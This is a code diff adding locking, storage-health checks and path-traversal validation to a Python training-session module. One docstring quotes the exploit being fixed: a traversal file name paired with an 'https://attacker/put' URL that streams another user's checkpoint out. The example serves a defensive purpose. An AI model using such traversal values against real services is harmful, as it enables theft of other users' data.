@@ -11,9 +11,11 @@ Imported lazily inside ``MicroSAM`` method bodies: heavy deps (``torch``,
 module stays introspectable with only ``bioengine[worker]`` + the stdlib.
 """
 
+import contextlib
 import json
 import os
 import re
+import tempfile
 import time
 import traceback
 import uuid
@@ -29,10 +31,78 @@ STATUS_STALE_SECONDS = 600
 # === session paths + file-backed status ===
 
 
+class SessionsRootUnavailable(RuntimeError):
+    """This replica cannot create, or cannot write, the directory runs are kept in.
+
+    Raised from two places, because they are two different facts: `sessions_root`
+    raises it when the store cannot be CREATED, and `assert_sessions_root_writable`
+    when the store exists but refuses a WRITE. A store that exists read-only
+    satisfies the first and fails the second.
+
+    A ``RuntimeError`` and not a ``ValueError``: nothing the caller asked for is
+    wrong. The replica cannot serve ANY run operation, and that is a property of
+    where it is running rather than of the request.
+
+    Measured 2026-11-25 on a de.NBI replica whose ``Path.home()`` was
+    ``/home/ray`` on a read-only filesystem: `start_training`,
+    `list_training_sessions` and `get_training_status` all raised an identical
+    bare ``OSError`` from the ``mkdir`` below, while the app reported RUNNING
+    and every deployment HEALTHY. Nothing said which of those failures was the
+    same failure, or that the replica could never serve a run at all.
+    """
+
+
 def sessions_root() -> Path:
     # Under the container's mounted ~/.bioengine so sessions survive restarts.
     root = Path.home() / ".bioengine" / "micro_sam_sessions"
-    root.mkdir(parents=True, exist_ok=True)
+    try:
+        root.mkdir(parents=True, exist_ok=True)
+    except OSError as exc:
+        # NAMED, and says what it means for the app rather than for the syscall.
+        # Every run-touching path funnels through here, so a bare mkdir error
+        # surfaces identically at a dozen call sites with nothing tying them
+        # together -- which is exactly how a replica came to look healthy while
+        # being unable to do anything with runs. `_health` in entry.py calls
+        # this so the condition reports as UNHEALTHY and Serve replaces the
+        # replica, rather than it staying in the routing table forever.
+        raise SessionsRootUnavailable(
+            f"cannot create the training-run store at {root}: {exc}. This "
+            "replica cannot serve any training-run operation while that path "
+            "cannot be created."
+        ) from exc
+    return root
+
+
+def assert_sessions_root_writable() -> Path:
+    """Prove the run store accepts a WRITE, not merely that it exists.
+
+    `sessions_root` only establishes that the directory could be CREATED, and
+    `mkdir(exist_ok=True)` succeeds on a directory that already exists however
+    read-only it is: Linux reports EEXIST before EROFS and `exist_ok` swallows
+    it. So a store that exists and refuses every write left this replica
+    HEALTHY while every run write failed -- the precise symptom this check was
+    added for. Measured two ways: a pre-created store chmod'ed 0o555, where
+    `sessions_root()` returns the path and writing into it raises EACCES; and a
+    real read-only mount, where `mkdir(exist_ok=True)` on the existing
+    directory succeeds while creating anything inside it raises EROFS.
+
+    So write something. A create-and-unlink is the cheapest probe that cannot
+    be satisfied by a path that merely exists.
+    """
+    root = sessions_root()
+    probe = root / f".writable-{os.getpid()}-{uuid.uuid4().hex}"
+    try:
+        probe.write_text("")
+    except OSError as exc:
+        raise SessionsRootUnavailable(
+            f"the training-run store at {root} exists but refuses writes: "
+            f"{exc}. This replica cannot serve any training-run operation."
+        ) from exc
+    finally:
+        try:
+            probe.unlink()
+        except OSError:
+            pass
     return root
 
 
@@ -123,11 +193,20 @@ def session_dir(session_id: str) -> Path:
     return candidate
 
 
-def session_backend(session_id: str) -> str:
+def session_backend(session_id: str, *, status: Optional[Dict[str, Any]] = None) -> str:
     """Fine-tuning backend a session used — 'microsam' (default) or 'cellpose'.
+
     Recorded in status.json at session start; the two backends save their
-    checkpoint in different places, so this drives ``checkpoint_path``."""
-    return read_status(session_id).get("backend", "microsam")
+    checkpoint in different places, so this drives ``checkpoint_path``.
+
+    *status* lets a caller that has ALREADY read the record answer from it
+    instead of reading it again. `get_status` does, and that one re-read was
+    half the cost of the run listing: it is called once per run, so a history
+    of N runs read 2N records where N would do.
+    """
+    if status is None:
+        status = read_status(session_id)
+    return status.get("backend", "microsam")
 
 
 # Our public cpsam/cpdino model_type strings → the cellpose ``pretrained_model``
@@ -263,13 +342,19 @@ def detect_gpu_memory() -> Dict[str, Any]:
     }
 
 
-def checkpoint_path(session_id: str) -> Path:
+def checkpoint_path(
+    session_id: str, *, status: Optional[Dict[str, Any]] = None
+) -> Path:
     """Servable checkpoint for a finished session, by backend:
     micro-sam's torch_em writes ``<dir>/checkpoints/<name>/best.pt``; cellpose's
     ``train_seg`` (save_path=<dir>, model_name='model') writes ``<dir>/models/model``.
+
+    *status* is passed straight to `session_backend`, so a caller holding the
+    record already does not pay for a second read of it. `get_status` calls
+    this on every run it reports.
     """
     sdir = session_dir(session_id)
-    if session_backend(session_id) == "cellpose":
+    if session_backend(session_id, status=status) == "cellpose":
         return sdir / "models" / "model"
     return sdir / "checkpoints" / session_id / "best.pt"
 
@@ -338,6 +423,53 @@ def new_session_id() -> str:
     return datetime.now().strftime("%Y-%m-%d-%H%M%S") + "-" + uuid.uuid4().hex[:8]
 
 
+def write_status_best_effort(session_id: str, **fields: Any) -> bool:
+    """`write_status` for a write the RUN MUST SURVIVE. True if it landed.
+
+    The record lock introduced two exceptions that never existed before:
+    `RunRecordLockTimeout` when the mutex cannot be taken, and
+    `RunRecordUnreadable` when the file on disk will not parse. Both are right
+    to raise at a write whose whole point is to be durable -- a terminal status,
+    a failure record -- because an unlocked merge is what silently erases a
+    record.
+
+    They are wrong to raise at a HEARTBEAT. A heartbeat exists only to refresh
+    `updated_at` so a long epoch does not trip the stale window; it carries no
+    outcome, and the next one is a minute away.
+
+    **What an unhandled heartbeat exception actually does**, stated precisely
+    because an earlier version of this docstring overstated it: the heartbeat
+    runs on a daemon thread, so the exception ends THAT THREAD and the training
+    process carries on. It does not kill the run directly. What it does is stop
+    `updated_at` advancing, silently -- and once `STATUS_STALE_SECONDS` passes,
+    `get_status` sweeps a LIVE run from TRAINING to STOPPED. So a contended
+    lock would make a healthy run report itself dead, which is the same
+    stale-window failure the heartbeat exists to prevent, arrived at from the
+    other side.
+
+    Progress writes are the same shape: an epoch curve that misses one update
+    is repaired by the next, and by the reconciliation at the end.
+
+    So this is for heartbeat and progress ONLY. Terminal writes keep calling
+    `write_status` and keep raising. The split is deliberate and is tested both
+    ways round, because a catch-all here would hide exactly the failure the
+    lock was built to surface.
+    """
+    try:
+        write_status(session_id, **fields)
+        return True
+    except (RunRecordLockTimeout, RunRecordUnreadable) as exc:
+        # Logged with the session id so a run whose timestamps go quiet can be
+        # tied to the reason. Not re-raised: see above.
+        print(
+            f"[model-finetune] run {session_id}: a non-terminal status write was "
+            f"skipped ({type(exc).__name__}: {exc}). The run continues; the next "
+            "update will carry the state.",
+            flush=True,
+        )
+        return False
+
+
 def read_status(session_id: str) -> Dict[str, Any]:
     p = _status_path(session_id)
     if not p.exists():
@@ -348,6 +480,74 @@ def read_status(session_id: str) -> Dict[str, Any]:
         return {}
 
 
+# The mutex a writer holds while merging a record.
+#
+# ⚠ NOT flock, and not fcntl.lockf -- and the reason is portability across
+# mounts, not that they always fail. Two measurements on the same de.NBI NFSv3
+# export disagree, and both are reported here because the disagreement is the
+# point:
+#
+#     flock  -> ENOLCK on one mount, SUCCEEDED on the worker pod's mount
+#     lockf  -> ENOLCK on one mount, SUCCEEDED on the worker pod's mount
+#     link   -> 600/600, and EEXIST when held, on both
+#     none   -> 301/600   (the control: the processes genuinely race)
+#
+# Whether the NFS client was mounted with locking is a property of the pod spec,
+# and a Serve replica is a KubeRay pod in another namespace with its own mount
+# -- so the replica's answer is not the worker's answer. A lock that RAISES
+# ENOLCK on every write would take out every run operation on that replica, and
+# which replicas those are is not knowable from here.
+#
+# os.link() needs no lock manager: creating a unique file and linking it to a
+# well-known name is atomic over NFSv3 and fails with EEXIST when somebody holds
+# it. It is the classic NFS-safe mutex, it held on both mounts, and it works on
+# a local filesystem too, so there is one code path rather than two.
+RECORD_LOCK_NAME = ".status.mutex"
+
+
+# ⚠ ACROSS NODES, the reap's judgement rests on a `stat` another NFS client may
+# answer from its attribute cache, and that cache can outlive this window (the
+# usual client defaults reach 60 s, twice the 30 s below). So a reaper on one
+# node can in principle act on a stale view of a lock held on another. Measured
+# only within ONE pod, where a single client's cache is coherent; the
+# cross-client case is NOT measured. Accepted rather than fixed: it can only
+# bite after a holder has died, which is the case the reap exists for and
+# already concedes an overlap. The ordinary acquire path is unaffected --
+# `os.link`'s EEXIST is decided on the server, not from any cache.
+# How long a mutex may be held before another writer treats it as abandoned.
+# A link-based lock has no kernel to release it if the holder dies, so without
+# this one crashed writer wedges a run's record forever. Generous relative to a
+# merge, which is a small read and a rename: anything near this means the holder
+# is gone, not slow.
+RECORD_LOCK_STALE_S = 30.0
+
+# How long to keep trying before giving up and raising. Raising is the safe
+# direction: a caller that cannot take the mutex must NOT merge anyway, because
+# merging unlocked is the data loss this exists to prevent.
+RECORD_LOCK_WAIT_S = 60.0
+
+
+class RunRecordLockTimeout(RuntimeError):
+    """Could not take a run's record mutex, so the merge was refused.
+
+    Refusing is the safe direction: merging without the mutex is precisely the
+    lost update this lock exists to prevent, so a caller that cannot acquire it
+    must not proceed.
+    """
+
+
+class RunRecordUnreadable(RuntimeError):
+    """A run's record exists but cannot be parsed, so a merge would destroy it.
+
+    Raised only by `write_status`, deliberately. A READER must stay tolerant --
+    `read_status` answers {} so one bad record cannot take the whole history
+    down -- but a WRITER that reads {} and merges into it writes the empty dict
+    back as the entire record. The tolerant read and the destructive write look
+    identical in the code and are opposite in effect, which is why the writer
+    now reads the file itself rather than going through `read_status`.
+    """
+
+
 _TERMINAL = ("COMPLETED", "FAILED", "STOPPED")
 
 # A terminal status may only be changed by an equal-or-higher-ranked writer.
@@ -355,6 +555,210 @@ _TERMINAL = ("COMPLETED", "FAILED", "STOPPED")
 # child (the training outcome) outranks the supervisor (which only sees the
 # subprocess rc) and the entry bare-except (which cannot see the child at all).
 _TERMINATED_BY = {"entry": 1, "supervisor": 2, "child": 3, "user_stop": 4}
+
+
+def _store_age(reference: Path, target: os.stat_result) -> float:
+    """Seconds between *target*'s mtime and now, measured by the STORE's clock.
+
+    Never `time.time() - st_mtime`. On the NFS share these replicas use, mtime
+    is set by the SERVER, and the server's clock is not this process's.
+    Measured on the de.NBI share 2026-11-25: a file stamped with
+    `os.utime(path, None)` came back with an mtime **78.6 seconds in the
+    future** relative to the caller's `time.time()`.
+
+    That skew is fatal to a staleness test built on the local clock, in both
+    directions. Ahead, as measured, every lock looks like it was taken in the
+    future, no abandoned lock is EVER reaped, and every later writer waits out
+    `RECORD_LOCK_WAIT_S` and raises. Behind, every live lock looks ancient and
+    the mutex excludes nothing. Measured on the share before this fix: 18 of 18
+    writes lost to `RunRecordLockTimeout`, one reporting the mutex as "held for
+    -18.5s", and the lock file left behind.
+
+    *reference* must be a file on the SAME store whose mtime was just stamped,
+    so both sides of the subtraction come from one clock and the skew cancels.
+    The acquire loop stamps its unique file immediately before each attempt, so
+    it already has one.
+    """
+    return reference.stat().st_mtime - target.st_mtime
+
+
+def _reap_stale_mutex(
+    run_dir: Path, mutex: Path, unique: Path, judged_ino: int
+) -> bool:
+    """Replace a stale mutex with THIS writer's lock. True if we now hold it.
+
+    Reaping by removing the stale file cannot be made safe. Two designs tried
+    it and failed the same way:
+
+    * stat-then-unlink let a writer that judged mutex L1 stale unlink a FRESH
+      L2 somebody had linked in the meantime -- unlink acts on the path, not on
+      the inode that was judged;
+    * stat-then-RENAME has the identical defect, and renaming into a scratch
+      name so the inode can be checked afterwards only moves the damage: the
+      path is EMPTY between the rename and the restore, and a third writer
+      links into that gap while the victim is still inside its critical
+      section. Measured, with a 20ms delay on the rename: still 1-4 overlapping
+      writers in 2 runs of 4.
+
+    So this never removes the mutex at all. It REPLACES it, with `os.rename`,
+    which overwrites atomically -- the path never goes empty, so there is no
+    gap to lose a race in. Two things make that safe:
+
+    * **one reaper per inode.** `.reap-<ino>` is claimed with the same atomic
+      `os.link`, so of several writers that judged one mutex stale exactly one
+      proceeds and the rest back off while the path still holds the stale
+      inode, which they will correctly judge stale again. A claim abandoned by
+      a dead reaper is itself stale after `RECORD_LOCK_STALE_S`; it is linked
+      from *our* freshly stamped file, not from the mutex, so its mtime says
+      when it was claimed rather than inheriting the stale inode's.
+    * **the inode is re-checked after the claim is won**, so a mutex that was
+      replaced between the stat and the claim is left strictly alone.
+
+    What remains, stated rather than papered over: if the presumed-dead holder
+    of `judged_ino` releases AND another writer acquires in the window between
+    that re-check and the rename, the rename overwrites that writer's lock.
+    That requires the holder judged dead to be alive after all, which is the
+    stale timeout's accepted trade-off, not a race this function adds.
+    """
+    claim = run_dir / f".reap-{judged_ino}"
+    os.utime(unique, None)
+    try:
+        os.link(unique, claim)
+    except FileExistsError:
+        try:
+            if _store_age(unique, claim.stat()) > RECORD_LOCK_STALE_S:
+                claim.unlink()  # the reaper that claimed it died mid-reap
+        except (FileNotFoundError, OSError):
+            pass
+        return False
+    except OSError:
+        return False
+    try:
+        try:
+            if mutex.stat().st_ino != judged_ino:
+                return False  # already replaced; not ours to touch
+        except FileNotFoundError:
+            return False
+        spare = run_dir / f".mutex-{os.getpid()}-{uuid.uuid4().hex}"
+        try:
+            os.link(unique, spare)
+        except OSError:
+            return False
+        os.utime(unique, None)  # the lock's mtime must say when it was TAKEN
+        try:
+            os.rename(spare, mutex)
+        except OSError:
+            try:
+                spare.unlink()
+            except FileNotFoundError:
+                pass
+            return False
+        return True
+    finally:
+        try:
+            claim.unlink()
+        except FileNotFoundError:
+            pass
+
+
+@contextlib.contextmanager
+def _record_mutex(run_dir: Path, session_id: str):
+    """Hold the run's mutex for the duration of the block.
+
+    `os.link` of a unique file onto a well-known name: atomic on NFSv3, where
+    unlike flock and lockf, it needs no lock manager -- which one mount of this
+    share does not offer. See the note above `RECORD_LOCK_NAME`.
+
+    An abandoned mutex older than `RECORD_LOCK_STALE_S` is reaped and the
+    acquisition retried, because nothing releases a link-based lock when its
+    holder dies.
+
+    TWO things about that path are load-bearing, and the first version of this
+    function got both wrong:
+
+    * **The unique file is stamped immediately before `os.link`, not when it is
+      created.** `os.link` gives the mutex the unique file's mtime, so stamping
+      at queue time meant a writer that waited N seconds acquired a mutex that
+      already looked N seconds old. After a holder dies every queued writer
+      waits about `RECORD_LOCK_STALE_S`, so the winner linked an
+      already-stale mutex and the next waiter reaped it WHILE IT WAS HELD.
+      Measured on that version: up to six writers inside the critical section
+      at once and a write lost in four trials of five -- the lock broken
+      exactly in the case the reap exists for.
+    * **Reaping REPLACES the mutex, it never removes it.** Removal cannot be
+      made safe here: unlink and rename both act on the PATH, not on the inode
+      that was judged stale, so a writer holding an old verdict destroys a
+      fresh lock somebody linked in the meantime -- and renaming into a scratch
+      name to check the inode afterwards only moves the damage, because the
+      path is EMPTY between the rename and the restore and a third writer links
+      into that gap. `_reap_stale_mutex` instead overwrites the stale inode
+      with this writer's own, atomically, so the path is never empty; see its
+      docstring for the per-inode arbitration that keeps two reapers apart and
+      for what the stale timeout still concedes.
+    * **The release deletes the mutex only while it is still ours**, comparing
+      `st_ino` against the holder's own unique link. A holder that overran the
+      window has already been reaped, and unlinking on the way out would delete
+      its SUCCESSOR's mutex and admit a third writer.
+
+      Measured on this machine, 6 writers against a dead holder's lock, three
+      trials per run: stat-then-unlink and stat-then-rename both overlap (4 runs
+      of 4 red, up to 4 writers at once); rename-then-restore, 2 runs of 4 red;
+      replace-in-place, 10 runs of 10 green with 0 overlap events. Two earlier
+      versions of this docstring claimed guarantees the code did not have, so
+      those numbers are what this one rests on.
+    """
+    mutex = run_dir / RECORD_LOCK_NAME
+    unique = run_dir / f".mutex-{os.getpid()}-{uuid.uuid4().hex}"
+    unique.write_text(str(time.time()))
+    deadline = time.monotonic() + RECORD_LOCK_WAIT_S
+    try:
+        while True:
+            try:
+                # STAMP IMMEDIATELY BEFORE LINKING. The mutex inherits this
+                # mtime, and it must say when the lock was TAKEN, not when this
+                # writer joined the queue -- see the docstring.
+                os.utime(unique, None)
+                os.link(unique, mutex)
+                break
+            except FileExistsError:
+                try:
+                    judged = mutex.stat()
+                except FileNotFoundError:
+                    continue  # released between the link and the stat
+                age = _store_age(unique, judged)
+                if age > RECORD_LOCK_STALE_S:
+                    if _reap_stale_mutex(run_dir, mutex, unique, judged.st_ino):
+                        break  # the reap replaced it with OUR lock
+                    time.sleep(0.01)
+                    continue
+                if time.monotonic() > deadline:
+                    raise RunRecordLockTimeout(
+                        f"could not take the record mutex for run {session_id} "
+                        f"within {RECORD_LOCK_WAIT_S:.0f}s ({mutex} held for "
+                        f"{age:.1f}s). Refusing to merge without it, because an "
+                        "unlocked merge is what silently erases a record."
+                    )
+                time.sleep(0.01)
+        try:
+            yield
+        finally:
+            # Unlink the mutex ONLY while it is still ours. Holding it means
+            # `mutex` and `unique` are links to one inode, so comparing them
+            # identifies it. A holder that overran the staleness window has
+            # already been reaped and somebody else may hold the path -- that
+            # overlap is the accepted cost of having a timeout at all, but
+            # deleting the NEXT holder's mutex on the way out would let a THIRD
+            # writer in, and that part is avoidable.
+            try:
+                if os.stat(mutex).st_ino == os.stat(unique).st_ino:
+                    mutex.unlink()
+            except FileNotFoundError:
+                pass
+    finally:
+        try:
+            unique.unlink()
+        except FileNotFoundError:
+            pass
 
 
 def write_status(session_id: str, **fields) -> Dict[str, Any]:
@@ -370,7 +774,62 @@ def write_status(session_id: str, **fields) -> Dict[str, Any]:
     refinements are unaffected. An unknown/absent ``terminated_by`` ranks 0."""
     p = _status_path(session_id)
     p.parent.mkdir(parents=True, exist_ok=True)
-    cur = read_status(session_id)
+
+    # EXCLUSIVE for the whole read-merge-replace. A private scratch file stops a
+    # TORN document being installed; it does nothing about a LOST UPDATE, which
+    # is the other half and the one that erases a user's stop.
+    #
+    # Measured on the scratch-file-only version: five writers plus one user-stop,
+    # the stop erased and the record back to TRAINING on the first trial, and
+    # every writer's last write lost in 20 of 20 trials. A read that happened
+    # before another writer's replace writes its stale copy back over it, and the
+    # terminal-status precedence below cannot refuse an incumbent it never saw.
+    #
+    # The run directory is the only place guaranteed to be on the same
+    # filesystem as the record, which link() requires.
+    #
+    # NOTE ON CLOCK SKEW, unmeasured: staleness compares the SERVER-set mtime of
+    # the mutex with this client's time.time(). On the NFS share those are
+    # different machines, so skew shifts the window by however far the clocks
+    # differ. A 30s window tolerates a few seconds of skew; it would not
+    # tolerate minutes. Not measured on this cluster.
+    with _record_mutex(p.parent, session_id):
+        return _write_status_locked(p, session_id, fields)
+
+
+def _write_status_locked(p, session_id: str, fields: Dict[str, Any]) -> Dict[str, Any]:
+    """The merge itself. Call ONLY with the record lock held.
+
+    Split out so the lock scope is one `with` block that a reader can see whole,
+    rather than an early `return` inside it leaving the reader to check whether
+    every path is covered.
+    """
+    # An UNREADABLE record is not an empty one. `read_status` answers {} for
+    # both "no file yet" and "the file would not parse", which is right for a
+    # reader -- a history page should not break on one bad record -- and
+    # catastrophic here: starting a merge from {} writes the empty dict back as
+    # the whole record, so status, owner, created_at and the terminated_by
+    # provenance are all discarded in favour of whatever this one call is
+    # setting. Measured: six concurrent writers reduced a record to their own
+    # fields with the pre-existing `status` key gone, and the result was valid
+    # JSON, so nothing downstream could tell.
+    if p.exists():
+        try:
+            cur = json.loads(p.read_text())
+        except Exception as exc:
+            raise RunRecordUnreadable(
+                f"the record for run {session_id} exists but does not parse "
+                f"({exc}); refusing to overwrite it with a fresh one, which "
+                "would discard whatever it still holds."
+            ) from exc
+        if not isinstance(cur, dict):
+            raise RunRecordUnreadable(
+                f"the record for run {session_id} is a {type(cur).__name__}, "
+                "not an object; refusing to overwrite it."
+            )
+    else:
+        cur = {}
+
     cur_status, new_status = cur.get("status"), fields.get("status")
     if cur_status in _TERMINAL and new_status is not None and new_status != cur_status:
         cur_prec = _TERMINATED_BY.get(cur.get("terminated_by"), 0)
@@ -379,9 +838,36 @@ def write_status(session_id: str, **fields) -> Dict[str, Any]:
             return cur
     cur.update(fields)
     cur["updated_at"] = time.time()
-    tmp = p.with_suffix(".json.tmp")
-    tmp.write_text(json.dumps(cur))
-    os.replace(tmp, p)
+
+    # A scratch file UNIQUE to this writer. The name used to be derived from the
+    # target -- `status.json.tmp` -- which every concurrent writer therefore
+    # shared, and that is two bugs in one:
+    #
+    #   * `write_text` truncates and writes, which is not atomic, so one writer
+    #     could `os.replace` a document another writer was halfway through
+    #     writing. A TORN record then becomes the real one.
+    #   * the first `os.replace` consumes the shared file, so the second raised
+    #     FileNotFoundError. Measured at 50 of 240 writes across six processes.
+    #
+    # This is not a hypothetical second replica: the entry replica, both runtime
+    # replicas and the training subprocess all write this file during a run,
+    # from different processes.
+    #
+    # `mkstemp` in the SAME directory, because `os.replace` is only atomic
+    # within one filesystem and the run directory is the only place guaranteed
+    # to be on the same one as the target.
+    fd, tmp_name = tempfile.mkstemp(dir=str(p.parent), prefix=".status-", suffix=".tmp")
+    try:
+        with os.fdopen(fd, "w") as fh:
+            fh.write(json.dumps(cur))
+        os.replace(tmp_name, p)
+    except BaseException:
+        # Never leave scratch files behind in a directory the listing walks.
+        try:
+            os.unlink(tmp_name)
+        except OSError:
+            pass
+        raise
     return cur
 
 
@@ -892,6 +1378,138 @@ def require_caller_may_resume_run(
         )
 
 
+class InvalidExportId(ValueError):
+    """An export_id the server could not have issued."""
+
+
+class InvalidPackageMember(ValueError):
+    """A package file name that is not one this export announced."""
+
+
+#: What `export_model` mints is `uuid4().hex`. The check is deliberately a
+#: little wider than that so an id minted by an older version still resolves,
+#: but narrow enough that it cannot be a path: no separators, no `..`.
+EXPORT_ID_PATTERN = re.compile(r"\A[A-Za-z0-9][A-Za-z0-9._-]{0,127}\Z")
+
+
+def validate_export_id(export_id: Any) -> str:
+    """The export_id, or raise.
+
+    The id becomes a file name under the exports root, exactly as a session id
+    becomes a directory name under the sessions root -- and that one was a
+    traversal until it was checked. The value is NOT echoed in full: it is
+    caller-controlled and this message reaches logs.
+    """
+    if not isinstance(export_id, str):
+        raise InvalidExportId(
+            f"export_id must be a string, got {type(export_id).__name__}"
+        )
+    if ".." in export_id or not EXPORT_ID_PATTERN.match(export_id):
+        raise InvalidExportId(
+            f"export_id is not a valid export identifier "
+            f"(length {len(export_id)}, starts {export_id[:12]!r})"
+        )
+    return export_id
+
+
+def package_member_path(package_dir: Any, name: Any, *, announced: Any) -> Path:
+    """The path of one member of a built package, or raise.
+
+    TWO independent layers, deliberately not one, and the same shape as
+    `session_dir`:
+
+    1. the name must be one the export's own record ANNOUNCED. That is an
+       allow-list of the files this package actually has, which is a stronger
+       statement than any pattern over names;
+    2. the resolved path must still be inside the resolved package directory.
+       Not redundant with layer 1 -- it is what still holds if the allow-list
+       is ever loosened, and it also catches a symlink inside the package that
+       points out of it, which layer 1 cannot see.
+
+    The hole this closes, measured on the method before it existed: the caller
+    supplies the file names, they were joined to the package directory
+    unchecked, and `push_export(my_export, {"../../.bioengine/sessions/<other
+    run>/best.pt": "https://attacker/put"})` streamed ANOTHER run's checkpoint
+    to a URL of the caller's choosing. An absolute name did the same, because
+    joining an absolute path discards the directory it was joined to. Binding
+    the handle to its creator without bounding the names would only have moved
+    the hole from "somebody else's export id" to "your own".
+    """
+    names = set()
+    for entry in announced or []:
+        if isinstance(entry, dict) and isinstance(entry.get("name"), str):
+            names.add(entry["name"])
+        elif isinstance(entry, str):
+            names.add(entry)
+    if not isinstance(name, str) or name not in names:
+        raise InvalidPackageMember(
+            f"'{name if isinstance(name, str) else type(name).__name__}' is not "
+            "a file of this export; only the names it reported can be pushed"
+        )
+    root = Path(package_dir).resolve()
+    candidate = (root / name).resolve()
+    try:
+        candidate.relative_to(root)
+    except ValueError:
+        raise InvalidPackageMember(
+            "a package file name resolves outside the package directory"
+        )
+    return candidate
+
+
+def caller_may_use_export(export_id: str, context: Any) -> bool:
+    """True iff *context* identifies the export's creator, or a ``bioimage-io``
+    admin.
+
+    An export id is a handle to a run's WEIGHTS: the READY record carries a
+    presigned `download_url` with six hours of life in it, plus the name of the
+    resumable checkpoint inside the package, and `push_export` streams the whole
+    package to any presigned URL a caller supplies. `export_model` is already
+    owner-or-admin, so this closes the gap between "who may start an export" and
+    "who may use its handle" -- which were not the same question.
+
+    Deliberately the SAME shape as :func:`caller_may_mutate`, including the two
+    properties that one learned the hard way:
+
+    * the admin test is reached for an OWNED export too, not only an ownerless
+      one, so an administrator is not refused their own stated authority;
+    * an export with no usable creator is admin-only. That covers an export
+      minted before this field existed, which cannot be attributed to anybody.
+      Those expire within hours, so the window in which a non-admin is refused
+      their own in-flight export is bounded and known rather than permanent.
+
+    Reads what is on disk through :func:`read_export` and creates nothing, so
+    asking about an export that does not exist is safe and answers False for a
+    non-admin -- which is what lets the refusal be identical for "not yours"
+    and "no such export". (An earlier version of this note said
+    :func:`get_export` WRITES the swept record; it does not. It changes its
+    own in-memory copy and returns it. The gate still runs first, because the
+    refusal must not depend on what the record says.)
+    """
+    owner = read_export(export_id).get("_owner")
+    if isinstance(owner, str) and owner:
+        caller = caller_identity(context).get("owner")
+        if caller is not None and caller == owner:
+            return True
+        return caller_is_workspace_admin(context)
+    return caller_is_workspace_admin(context)
+
+
+def require_caller_may_use_export(export_id: str, context: Any) -> None:
+    """:func:`caller_may_use_export`, or raise :class:`NotTheOwner`.
+
+    The message says nothing about whether the export exists, who created it,
+    or whether the caller merely lacks admin. That is the point: an id is a
+    bearer capability, and a refusal that distinguished "not yours" from "no
+    such export" would turn this check into an oracle for guessing ids.
+    """
+    if not caller_may_use_export(export_id, context):
+        raise NotTheOwner(
+            "this export belongs to another caller; only the identity that "
+            "created it or a workspace administrator can use it"
+        )
+
+
 def redact_private(status: Dict[str, Any]) -> Dict[str, Any]:
     """Drop every private field, in place, and return the same dict.
 
@@ -913,7 +1531,7 @@ def get_status(session_id: str, *, include_private: bool = False) -> Dict[str, A
             "message": "no such session",
         }
     st["session_id"] = session_id
-    st["checkpoint_available"] = checkpoint_path(session_id).exists()
+    st["checkpoint_available"] = checkpoint_path(session_id, status=st).exists()
     # The config a run used, so a history listing can say WHAT was trained and not
     # merely that something was. It was already persisted per run and reachable only
     # from inside this app; `{}` for a run that died before the file was written.
@@ -934,8 +1552,45 @@ def get_status(session_id: str, *, include_private: bool = False) -> Dict[str, A
     return st
 
 
+def scan_runs_for_listing() -> Tuple[Dict[str, Dict[str, Any]], List[str], List[str]]:
+    """ONE walk of the sessions root, for the listing that needs both halves.
+
+    Returns ``(records, dataset_ids, skipped)``: every run's full record keyed
+    by session id, the distinct ``dataset_artifact_id`` values across them in
+    first-seen order, and the names that were skipped.
+
+    Exists because the published listing needs the dataset ids BEFORE it can
+    filter -- resolving which of them the caller manages is one artifact-manager
+    round trip each, and must happen once per call rather than once per run --
+    and then needs the records themselves. Asking for those separately read
+    every record twice over, on top of the read inside `get_status`: measured
+    at 3 reads per run, so 783 of them for the 261 runs on the production
+    store. A previous commit claimed to have removed that and had not; this is
+    the combined scan that actually does, and `test_the_PUBLISHED_listing_reads_each_record_ONCE`
+    measures the path the caller really takes rather than an inner helper.
+    """
+    records: Dict[str, Dict[str, Any]] = {}
+    datasets: Dict[str, None] = {}
+    names, skipped = run_names_on_disk()
+    for name in names:
+        try:
+            status = get_status(name, include_private=True)
+        except InvalidSessionId:
+            skipped.append(name)
+            continue
+        records[name] = status
+        dataset = status.get(DATASET_FIELD)
+        if isinstance(dataset, str) and dataset:
+            datasets.setdefault(dataset, None)
+    return records, list(datasets), skipped
+
+
 def list_sessions(
-    context: Any, *, writable_datasets: Any = frozenset()
+    context: Any,
+    *,
+    writable_datasets: Any = frozenset(),
+    records: Optional[Dict[str, Dict[str, Any]]] = None,
+    skipped: Optional[List[str]] = None,
 ) -> Dict[str, Dict[str, Any]]:
     """The runs this caller may see, keyed by session id, owner redacted.
 
@@ -972,10 +1627,25 @@ def list_sessions(
     attacker-controlled.
     """
     out: Dict[str, Dict[str, Any]] = {}
-    names, skipped = run_names_on_disk()
+    if records is not None:
+        # Already read by `scan_runs_for_listing`; re-reading them here is the
+        # cost this parameter exists to avoid. The names IT skipped have to be
+        # passed in with them: this function logs them, and a caller that
+        # supplies records but drops the skip list silently removes the only
+        # trace a stray directory leaves. That regressed once, when the single
+        # scan was introduced and the published entry point discarded them.
+        names = list(records)
+        skipped = list(skipped or [])
+    else:
+        names, found_skipped = run_names_on_disk()
+        skipped = list(skipped or []) + found_skipped
     for name in names:
         try:
-            status = get_status(name, include_private=True)
+            status = (
+                records[name]
+                if records is not None
+                else get_status(name, include_private=True)
+            )
         except InvalidSessionId:
             # The name passed but a deeper layer refused it -- today that means
             # a directory whose NAME is a valid session id but which is a
@@ -1028,7 +1698,20 @@ def exports_root() -> Path:
 
 
 def _export_path(export_id: str) -> Path:
-    return exports_root() / f"{export_id}.json"
+    """The record file for *export_id*, guaranteed to be under the exports root.
+
+    Validated AND contained, for the same reason `session_dir` is both: the id
+    arrives from a caller, and softening either check alone leaves the other
+    refusing.
+    """
+    root = exports_root()
+    candidate = root / f"{validate_export_id(export_id)}.json"
+    resolved_root = root.resolve()
+    try:
+        candidate.resolve().relative_to(resolved_root)
+    except ValueError:
+        raise InvalidExportId("export_id resolves outside the exports root")
+    return candidate
 
 
 def read_export(export_id: str) -> Dict[str, Any]:
